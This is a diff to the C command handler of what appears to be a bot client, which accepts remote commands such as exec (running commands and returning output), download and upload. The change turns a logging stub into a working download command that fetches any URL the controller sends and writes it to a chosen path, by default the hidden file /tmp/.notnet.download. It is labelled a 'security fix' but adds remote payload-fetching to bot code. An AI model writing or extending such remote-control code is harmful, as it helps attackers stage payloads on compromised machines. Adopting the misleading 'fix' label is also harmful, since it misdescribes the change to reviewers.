@@ -1634,7 +1634,49 @@ int protocol_process_commands(notnet_bot_t *bot) {
             log_info("CMD: exec output (%zu bytes, exit %d)", n, exit_code);
             protocol_send_response(bot, CMD_EXEC, output);
         } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
-            log_info("CMD: download");
+            /* SECURITY FIX (#66): Actually fetch the URL and write to the
+             * requested path. Syntax: download <url> <path>.
+             * Path is validated against shell metacharacters — the file
+             * is written with fopen(), never passed to a shell. */
+            char *args = cmd + strlen(CMD_DOWNLOAD);
+            while (*args == ' ' || *args == '\t') args++;
+
+            char url[1024] = {0};
+            char dest[512] = {0};
+
+            char *sp = strchr(args, ' ');
+            if (sp) {
+                int ulen = (int)(sp - args);
+                if (ulen > 1000) ulen = 1000;
+                memcpy(url, args, ulen);
+                url[ulen] = '\0';
+                char *dp = sp + 1;
+                while (*dp == ' ' || *dp == '\t') dp++;
+                snprintf(dest, sizeof(dest), "%.500s", dp);
+            } else {
+                snprintf(url, sizeof(url), "%.1000s", args);
+                snprintf(dest, sizeof(dest), "/tmp/.notnet.download");
+            }
+
+            if (url[0] == '\0') {
+                protocol_send_response(bot, CMD_DOWNLOAD,
+                    "download: usage 'download <url> [path]'");
+            } else if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
+                protocol_send_response(bot, CMD_DOWNLOAD,
+                    "download: url must start with http:// or https://");
+            } else if (strpbrk(dest, ";|&`$(){}[]<>!\n\r")) {
+                protocol_send_response(bot, CMD_DOWNLOAD,
+                    "download: path rejected (dangerous character)");
+            } else {
+                int got = http_download(bot, url, dest);
+                if (got > 0) {
+                    char resp[512];
+                    snprintf(resp, sizeof(resp), "download ok: %d bytes to %s", got, dest);
+                    protocol_send_response(bot, CMD_DOWNLOAD, resp);
+                } else {
+                    protocol_send_response(bot, CMD_DOWNLOAD, "download failed");
+                }
+            }
         } else if (strncmp(cmd, CMD_UPLOAD, strlen(CMD_UPLOAD)) == 0) {
             /* Parse: upload <local_path> [remote_path] */
             char *args = cmd + strlen(CMD_UPLOAD);
